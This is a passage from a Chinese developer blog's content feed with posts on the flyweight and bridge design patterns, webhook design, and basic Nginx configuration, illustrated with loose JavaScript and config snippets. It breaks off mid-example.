title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/facade.html">结构型模式 » 外观模式</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%A4%96%E8%A7%80%E6%A8%A1%E5%BC%8F">wikipedia - 外观模式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 门面模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊设计模式（2）：享元模式</title>
      <link href="/blog/2017/02/04/the-flyweight-pattern-in-design-patterns/"/>
      <url>/blog/2017/02/04/the-flyweight-pattern-in-design-patterns/</url>
      
        <content type="html"><![CDATA[<p>如何理解享元模式，“享”是共享的意思，“元”指的是元件，也就是小颗粒的东西，享元顾名思义便是共享小部件，很多系统或者程序包含大量对象，但是这些对象绝大多数都是差不多的，除了一些极个别的属性外。</p><p><img src="/../blogimgs/2017/02/04/6c0378f8ly1fcemcdy783j20p00dwaeb.jpg" alt="https://unsplash.com/search/share?photo=qgHGDbbSNm8 by Elaine Casap"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8ly1fcemcdy783j20p00dwaeb">--></p><span id="more"></span><h3 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h3><p>小喜负责团队的机器管理工作，包括测试机器的购买、借还等内容。机器的型号并不多，大约五六种。为了能够精确掌握每台机器的借还和使用情况，小喜通过如下方式设计数据管理模型：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Device</span> &#123;</span><br><span class="line">    <span class="comment">// 记录设备的基本信息</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">id, memory, frequency, processor, network, pixel, price, ...</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">id</span> = id;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">memory</span> = memory;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">frequency</span> = frenquency;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">processor</span> = porcessor;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">network</span> = network;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">pixel</span> = pixel;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">price</span> = price;</span><br><span class="line">        <span class="comment">// more attributes ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    checkout () &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hasCheckedOut</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">checkoutDate</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">giveback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hasCheckedOut</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">checkoutDate</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// more methods ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个模型还算是比较简单明了的，每次购买机器入库都会执行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> device = <span class="keyword">new</span> <span class="title class_">Device</span>(...);</span><br><span class="line"><span class="variable constant_">DB</span>.<span class="title function_">insert</span>(device);</span><br></pre></td></tr></table></figure><p>当有人借还设备时，便会执行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> device = <span class="title class_">Database</span>.<span class="title function_">query</span>(deviceId);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 借出</span></span><br><span class="line">device.<span class="title function_">checkout</span>();</span><br><span class="line"><span class="comment">// 归还</span></span><br><span class="line">device.<span class="title function_">giveback</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">DB</span>.<span class="title function_">update</span>(device);</span><br></pre></td></tr></table></figure><p>随着团队规模的扩大，加上集团并购了几个小公司，团队对设备的需求量急剧上升，并且测试标准也有所提升，要求覆盖国内所有常见机型，大约 50 多种，每个机型需要购置大约 100 台机器，总量有 5000 多台。</p><p>此时，小喜有点头疼了。每台设备的描述信息和借还记录信息都储存在各自的 <code>device</code> 对象中，每个对象大约需要占用 10kb 的内存，5000 多台设备，算下来需要占用 50Mb 的内存。几千个大对象放在内存中，这种数据管理模式让小喜有点方，咨询了下坐在旁边的小天同学有没有什么策略可以改良。</p><p>小天在小喜的电脑前比划了几下，最后抛了一个媚眼，小喜立马就懂了。</p><p>定义数据模型，一个 <code>Device</code> 对象代表一种型号的设备：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Device</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">type, xxx, ..</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">type</span> = type;</span><br><span class="line">        <span class="comment">// 一种设备的全部基本信息</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">xxx</span> = xxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>DevicePool</code> 管理各种型号的设备：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DevicePool</span> &#123;</span><br><span class="line">    <span class="comment">// hash 表保存设备信息</span></span><br><span class="line">    devicePool = &#123;&#125;;</span><br><span class="line">    <span class="title function_">create</span>(<span class="params">type, xxx, ...</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (devicePool[type]) <span class="keyword">return</span> devicePool[type];</span><br><span class="line">        <span class="keyword">const</span> device = <span class="keyword">new</span> <span class="title class_">Device</span>(type, xxx, ...);</span><br><span class="line">        devicePool[type] = device;</span><br><span class="line">        <span class="keyword">return</span> device;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设备的借还信息和其他信息，通过 <code>DeviceManager</code> 来管理：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DeviceManager</span> &#123;</span><br><span class="line">    deviceManager = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 借出时，添加借出记录</span></span><br><span class="line">    checkout (id, type, xxx, ...) &#123;</span><br><span class="line">        <span class="keyword">const</span> device = <span class="keyword">new</span> <span class="title class_">DevicePool</span>.<span class="title function_">create</span>(type, xxx, ...);</span><br><span class="line">        deviceManager[id] = &#123;</span><br><span class="line">            <span class="attr">device</span>: device,</span><br><span class="line">            hasCheckedOut = <span class="literal">true</span>,</span><br><span class="line">            checkoutDate = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 归还时，删除借出记录</span></span><br><span class="line">    <span class="title function_">giveback</span>(<span class="params">id, type</span>) &#123;</span><br><span class="line">        deviceManager[id].<span class="property">hasCheckedOut</span> = <span class="literal">false</span>;</span><br><span class="line">        deviceManager[id].<span class="property">checkoutDate</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小喜看了看内存，设备对象从 50Mb 下降到了 2Mb，小喜激动得一晚上没睡着。</p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>小天当时告诉小喜，可以想办法减少内存中重复的内容，同一类型的设备描述是相同的，没必要在每个对象中都保存一份。使用单例模式储存设备元信息（<code>Device</code> 类），使用工厂模式复用一个类型的设备描述信息（<code>DevicePool</code> 类）。小喜一下子就懂了。</p><p>小喜通过 <code>DevicePool</code> 和 <code>DeviceManager</code> 将数据元信息和数据动态信息进行了有效的隔离，然后通过 <code>checkout</code> 和 <code>giveback</code> 两个方法灵活地组合了这两类信息，组合的时候，有效地控制了内存的无效复制。</p><h3 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h3><p>享元模式的核心在于享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，用户需要对象时，首先从享元池中获取，如果享元池中不存在，则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。</p><p>在享元模式中有两个比较重要的关键词，内部变量和外部变量；内部变量是可以共享的属性集，而外部变量是对象之间的差异部分，通过相同+不同的方式组合诸多对象，可以有效地节省系统空间，降低内存大小。</p><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="https://zh.wikipedia.org/wiki/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F">wikipedia - 享元模式</a></li><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/flyweight.html">结构型模式 » 享元模式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 享元模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊设计模式（1）：桥接模式</title>
      <link href="/blog/2017/01/16/the-bridge-pattern-in-design-patterns/"/>
      <url>/blog/2017/01/16/the-bridge-pattern-in-design-patterns/</url>
      
        <content type="html"><![CDATA[<p>桥接模式（Bridge Pattern），也有很多地方称之为桥连模式，不管怎么叫，记得有个桥（bridge）就行了，重点要理解这个「桥」是如何连接的，什么场景下需要使用桥接模式。</p><p><img src="/../blogimgs/2017/01/16/6c0378f8gw1fbsrsfhduuj20p00dw776.jpg" alt="by James Besser @https://unsplash.com/search/bridge?photo=fCCnUAGJrUQ"><!--<source src="http://ww3.sinaimg.cn/large/6c0378f8gw1fbsrsfhduuj20p00dw776.jpg">--></p><span id="more"></span><h3 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h3><p>小喜在做一个平台（阿尔法）的本地 SDK 工具，用于线下开发模块，这个工具的用户是 A 部门的前端人员，经过一个星期的紧张开发，小喜完成了工具的开发，用户反馈不错。大致的代码结构是这个样子的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SDK</span> &#123;</span><br><span class="line">    <span class="title function_">login</span>(<span class="params"></span>) &#123; <span class="comment">/* 登录控制 */</span> &#125;</span><br><span class="line">    <span class="title function_">start</span>(<span class="params"></span>) &#123; <span class="comment">/* 启动逻辑 */</span> &#125;</span><br><span class="line">    <span class="title function_">create</span>(<span class="params"></span>) &#123; <span class="comment">/* 创建模块 */</span> &#125;</span><br><span class="line">    <span class="title function_">publish</span>(<span class="params"></span>) &#123; <span class="comment">/* 提交模块 */</span> &#125;</span><br><span class="line">    <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">login</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">start</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">create</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">publish</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>突然有一天，老大小苏说，最近公司资源紧缺，雇了十几个外包，也要用这个 SDK 工具开发模块，而外包是不允许访问公司内网的。工程紧急，小苏要求小喜在一天内为外包同学搞一个可以用的 SDK，小喜想了想，点了点头，花了不到半天就搞定了：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">wbSDK</span> extend <span class="variable constant_">SDK</span> &#123;</span><br><span class="line">    <span class="title function_">wbLogin</span>(<span class="params"></span>) &#123; <span class="comment">/*外包登录*/</span> &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>准备交差的时候，小苏提醒道，外包是不允许直接提交模块的，必须有一个审核流程，于是小喜回去又修改了一下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">wbSDK</span> extend <span class="variable constant_">SDK</span> &#123;</span><br><span class="line">  <span class="title function_">wbLogin</span>(<span class="params"></span>) &#123; <span class="comment">/*外包登录*/</span> &#125;</span><br><span class="line">  <span class="title function_">wbPublish</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">checkPublish</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">publish</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一段时间之后，这个平台影响力做大了，部门 B、C、D 的同学都想使用这个工具，小喜此时觉得蛋有点疼，原因是每个部门的登录、检测和发布都有差异，为了让更多人受益于这个 SDK 工具，小喜只好硬着头皮写了这些代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B_SDK</span> extend <span class="variable constant_">SDK</span> &#123;</span><br><span class="line">    <span class="title function_">B_Login</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">B_Check</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">B_Publish</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C_SDK</span> extend <span class="variable constant_">SDK</span> &#123;</span><br><span class="line">    <span class="title function_">C_Login</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">C_Check</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">C_Publish</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>部门 F 的同学因为某种原因，也搞了一个类似的平台（里试石），而且做得比阿尔法要好，于是部门老板要求小喜将 SDK 对接到里试石，两个系统主要的差异在于模块的初始化和创建形式不同，而且这些差异在不同的部门之间也有不同。小喜擦干了眼泪，代码一直撸到天亮：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">baseSDK</span> extent <span class="variable constant_">SDK</span> &#123;</span><br><span class="line">    <span class="comment">// base SDK</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fuck_A_SDK</span> extend baseSDK &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fuck_B_SDK</span> extend baseSDK &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fuck_C_SDK</span> extend baseSDK &#123;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br></pre></td></tr></table></figure><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>以上问题的根源在于 <strong>影响 SDK 这个类的变量太多了</strong>。刚开始影响 SDK 的变量是登录，小喜在代码中添加了 <code>wbLogin</code> 方法，然后在代码中写了一堆 <code>if else</code> 逻辑，勉强解决问题。</p><p>后面影响的因素变得很多，有登录、初始化、检测、发布以及部门和平台差异等，小喜通过多次继承来解决问题，带来的麻烦是，代码的维护成本和冗余度都变高了。</p><p>小喜把这个问题丢给了小天，询问有没有更好的处理办法，小天说，刚开始 <code>Login</code> 独立出来一个类，不同部门和外包可以基于 <code>baseLogin</code> 扩展…小喜打断道，你丫的事后诸葛亮，我怎么知道会有外包和其他部门的同学用我的 SDK 呀 🤣🤣🤣</p><p>小天的想法是正确的，如果我们能够早早的探测到变量，将变量通过类抽象出来，那么使用的时候就会轻松很多了：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">baseSDK</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象变量</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">baseLogin</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">baseCreate</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">baseCheck</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C 部门使用示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C_Login</span> extent baseLogin &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C_Create</span> extent baseCreate &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C_Check</span> extent baseCheck &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动程序</span></span><br><span class="line">runSDK = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> sdk = <span class="keyword">new</span> <span class="title function_">baseSDK</span>();</span><br><span class="line">     sdk.<span class="title function_">setLogin</span>(<span class="keyword">new</span> <span class="title function_">C_Login</span>());</span><br><span class="line">     sdk.<span class="title function_">setCreate</span>(<span class="keyword">new</span> <span class="title function_">C_Create</span>());</span><br><span class="line">     sdk.<span class="title function_">setCheck</span>(<span class="keyword">new</span> <span class="title function_">C_Check</span>());</span><br><span class="line">     sdk.<span class="title function_">init</span>();     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>桥接模式的思想就是：<strong>将抽象部分与实现部分分离，使它们都可以独立地变化。</strong></p><p>分离抽象部分，要尽可能多的考虑哪些是变量，哪些是常量，常量可以写死在代码中，而变量就需要抽象出来交给管理器去管理，尤其是十分复杂的变量（比如登录这个操作）。</p><p>在桥接模式中，每一个被抽象出来的变量，都需要在主体中提供一个渠道——也就是「桥」——来衔接，比如上面代码中的 <code>sdk.setLogin()</code> 方法，它的作用就是连接 <code>new C_Login()</code>。这应该就是为什么这个模式被命名为 Bridge 的原因吧。</p><p>S.O.L.I.D 五项原则中有一条是单一职责原则，意思就是一个类只应该有一个影响它变化的因素，小喜刚开始的设计就违背了这个原则。倘若再给 SDK 加上几个变量，多次继承的方式还吃得消么？</p><h3 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h3><ul><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/bridge.html">《桥接模式》</a></li><li><a href="https://www.tutorialspoint.com/design_pattern/bridge_pattern.htm">《Design Patterns - Bridge Pattern》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 桥接模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何设计友好的 WebHook</title>
      <link href="/blog/2016/12/26/how-to-design-webhook/"/>
      <url>/blog/2016/12/26/how-to-design-webhook/</url>
      
        <content type="html"><![CDATA[<p>在一些工具流的设计中，经常遇到一个体验非常不好的情况：</p><p><img src="/../blogimgs/2016/12/26/TB19mqDOVXXXXceapXXXXXXXXXX-580-283.png" alt="轮询"><!--<source src="http://img.alicdn.com/tfs/TB19mqDOVXXXXceapXXXXXXXXXX-580-283.png">--></p><p>每次都需要采用长轮询或者隔一段时间再尝试的方式获取结果。其原因可能有两个：</p><ul><li>调用方（Client）没有一个稳定的在线服务，Server 无法主动联系 Client</li><li>Server 并没有考虑主动 Push 消息</li></ul><span id="more"></span><p>WebHook 存在的前提也需要满足以上两点，基本交互流程如下图：</p><p><img src="/../blogimgs/2016/12/26/TB1TdWyOVXXXXXyaFXXXXXXXXXX-622-321.png" alt="WebHook"><!--<source src="http://img.alicdn.com/tfs/TB1TdWyOVXXXXXyaFXXXXXXXXXX-622-321.png">--></p><h3 id="WebHook-的设计"><a href="#WebHook-的设计" class="headerlink" title="WebHook 的设计"></a>WebHook 的设计</h3><p><strong>1、接口设计</strong></p><p>WebHook 需要具备良好的自解性，也就是调用 Client 接口时，将自己完整的信息传达到客户端：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;A Niubility Platform&quot;</span>,</span><br><span class="line">        <span class="string">&quot;other&quot;</span>: <span class="string">&quot;other infomation&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;other&quot;</span>: <span class="string">&quot;other infomation&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;needCallback&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;serverTime&quot;</span>: <span class="string">&quot;2016-12-26 11:55:45&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在接口中需要详细说明，数据源从哪里来（source），数据需要穿给谁（target），传递那些数据（data），是否需要对方发送回执（needCallback），以及其他信息。</p><p>这样做的目的是为了避免发送出现错误，比如发错了对象；即便出错也方便通过日志记录排查问题。</p><p><strong>2、多 Hook 设计</strong></p><table><thead><tr><th>URI</th><th>备注</th><th>操作</th></tr></thead><tbody><tr><td><a href="http://example.com/receiveHook">http://example.com/receiveHook</a></td><td>通知小李修 bug</td><td><span style="color:blue">删除 &#x2F; 编辑</span></td></tr><tr><td><a href="http://example2.com/receiveHook">http://example2.com/receiveHook</a></td><td>通知小王修 bug</td><td><span style="color:blue">删除 &#x2F; 编辑</span></td></tr></tbody></table><p>WebHook 的设计一定要支持多 Hook，你永远都不知道下一个系统对接需求会在什么时候到来。</p><p>对于复杂的 Hook 设计，表格中可能还有：是否需要回执、是否停用、安全 Token、数据配置等项。</p><p><strong>3、安全性设计</strong></p><p>这里的安全性是为 Client 考虑的，Client 可能对  refer 或者 origin 做了限制，但这远远不够。当用户在 Server 端注册 WebHook 时，就应该开始考虑 Hook 的安全性了：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST</span></span><br><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&quot;x-webhook-sign&quot;</span>, <span class="title class_">SHA1</span>(webhook));</span><br></pre></td></tr></table></figure><p>Client 在接收到 WebHook 时需要验证 <code>x-webhook-sign</code> 字段，如果不正确应该向服务器响应的错误码（或许此时服务器收到错误码后应该停用这个 Hook）。</p><p><strong>4、retry 机制</strong></p><p>极有可能因为 Client 的不稳定，导致 Hook 调用失败，此时可以考虑多次尝试：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: webhookURL,</span><br><span class="line">    <span class="attr">retryTimes</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对于阻塞链路的 WebHook，比如对页面进行性能检测，只有检测通过后页面才可以发布，Client 端可能也需要提供类似的 WebHook 回执。</p><p>随着应用的复杂度提升，系统解耦变得越来越重要，WebHook 作为一种通用的交互方案，在设计上多留一个心眼，十分有意义！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebHook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 配置简述</title>
      <link href="/blog/2016/11/19/nginx-configuration-start/"/>
      <url>/blog/2016/11/19/nginx-configuration-start/</url>
      
        <content type="html"><![CDATA[<p>不论是本地开发，还是远程到 Server 开发，还是给提供 demo 给人看效果，我们时常需要对 Nginx 做配置，Nginx 的配置项相当多，如果考虑性能配置起来会比较麻烦。不过，我们往往只是需要一个静态 Server，或者一个反向代理 Server，这对 Nginx 来说小菜一碟。</p><p>本文将给大家介绍 Nginx 配置的基本知识，不想细看的同学可以直接跳到最后一个例子。</p><p><img src="/../blogimgs/2016/11/19/6c0378f8gw1f9yyq7qehrj20p00dwt94.jpg" alt="Nginx"><!--<source src="http://ww4.sinaimg.cn/large/6c0378f8gw1f9yyq7qehrj20p00dwt94.jpg">--></p><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Nginx 的安装就不解释了，方便起见，建议在各平台可以直接执行对应安装命令：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CentOS</span></span><br><span class="line">yum install nginx;</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">sudo apt-get install nginx;</span><br><span class="line"><span class="comment"># Mac</span></span><br><span class="line">brew install nginx;</span><br></pre></td></tr></table></figure><p>一般可以在 <code>/etc/nginx/nginx.conf</code> 中配置，启动参数为：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">nginx -s start;</span><br><span class="line"><span class="comment"># 重新启动，热启动，修改配置重启不影响线上</span></span><br><span class="line">nginx -s reload;</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">nginx -s stop;</span><br><span class="line"><span class="comment"># 修改配置后，可以通过下面的命令测试是否有语法错误</span></span><br><span class="line">nginx -t;</span><br></pre></td></tr></table></figure><p><code>-s</code>，signal，意思就是向 nginx 发送 <code>start|reload|stop</code> 命令，还是很好理解的。先看一个最简单的 <code>nginx.conf</code> 配置：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment"># 需要保留这一个段落，可以为空</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">127.0.0.1:8888</span>;</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span> /home/barret/test/;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动后，访问 <a href="htttp://127.0.0.1:8888">htttp://127.0.0.1:8888</a> ，如果 <code>/home/barret/test/</code> 下有 <code>index.html</code> 文件就会展示 <code>index.html</code> 的内容，否则返回 <code>404</code>。</p><h3 id="Nginx-配置一个-Web-服务器"><a href="#Nginx-配置一个-Web-服务器" class="headerlink" title="Nginx 配置一个 Web 服务器"></a>Nginx 配置一个 Web 服务器</h3><p>以下对配置 Web 服务器的参数做简单说明，包括如何配置端口、域名，如何处理请求，如何响应请求。</p><p><strong>1、 虚拟主机和请求的分发</strong></p><p>域名和端口的配置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">127.0.0.1:8000</span>;</span><br><span class="line"><span class="attribute">listen</span> *:<span class="number">8000</span>;</span><br><span class="line"><span class="attribute">listen</span> localhost:<span class="number">8000</span>;</span><br><span class="line"><span class="comment"># IPV6</span></span><br><span class="line"><span class="attribute">listen</span> [::]:<span class="number">8000</span>;</span><br><span class="line"><span class="comment"># other params</span></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> default_serer ssl;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">127.0.0.1</span> default_server accept_filter=dataready backlog=<span class="number">1024</span></span><br></pre></td></tr></table></figure><p>主机名配置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_name</span> www.barretlee.com barretlee.com</span><br><span class="line">server_name <span class="regexp">*.barretlee.com</span></span><br><span class="line">server_name ~^\.barret\.com$</span><br></pre></td></tr></table></figure><p>URI 匹配</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> = / &#123;</span><br><span class="line">    <span class="comment"># 完全匹配  =</span></span><br><span class="line">    <span class="comment"># 大小写敏感 ~</span></span><br><span class="line">    <span class="comment"># 忽略大小写 ~*</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /images/ &#123;</span><br><span class="line">    <span class="comment"># 前半部分匹配 ^~</span></span><br><span class="line">    <span class="comment"># 可以使用正则，如：</span></span><br><span class="line">    <span class="comment"># location ~* \.(gif|jpg|png)$ &#123; &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># 如果以上都未匹配，会进入这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 文件路径的定义</p><p>根目录设置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">root</span> /home/barret/test/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别名设置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> /blog &#123;</span><br><span class="line">    <span class="attribute">alias</span> /home/barret/www/blog/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> <span class="regexp">~ ^/blog/(\d+)/([\w-]+)$</span> &#123;</span><br><span class="line">    <span class="comment"># /blog/20141202/article-name  </span></span><br><span class="line">    <span class="comment"># -&gt; 